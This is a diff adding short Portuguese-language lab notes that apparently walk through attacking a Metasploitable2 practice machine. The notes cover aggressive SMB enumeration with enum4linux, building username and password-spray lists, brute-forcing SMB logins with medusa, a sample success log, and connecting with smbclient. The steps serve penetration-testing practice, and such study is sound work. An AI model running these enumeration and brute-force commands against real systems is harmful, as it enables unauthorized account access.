@@ -1,0 +1,14 @@
+# Ferramenta Utilizada
+enum4linux   
+enum4linux -a IP DO MESTALOITABLE2  | tee enum4_output.txtenum4linux # Comando que enumera de forma agressiva informações em um sistema SMB/Samba e, simultaneamente, salva a saída em um arquivo.
+nano  enum4_output.txt   #Visualiza o arquivo e neste caso é possível ver o nome dos usuarios e muitas outras infomrações importantes.
+echo -e "user\nmsfadmin\nadmin\nservice\nroot" > smb_users.txt  # Arquivo de nomes de usuarios
+echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt    # Arquivo de Possíveis senhas.
+medusa -h IP DO MESTALOITABLE2  -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50    # Executa o ataque de força bruta no SMB
+
+# Para saber se foi bem sucedido aparecerá a palavra ACCOUNT FOUND no começo e no final SUCCESS. 
+# 2025-10-26 01:19:16 ACCOUNT FOUND: [smbnt] Host: IP DO MESTALOITABLE2 User: msfadmin Password: msfadmin [SUCCESS ]
+
+# Para acessar via terminal
+smbclient -L \\192.168.56.101 -U msfadmin     
+# E por a senha
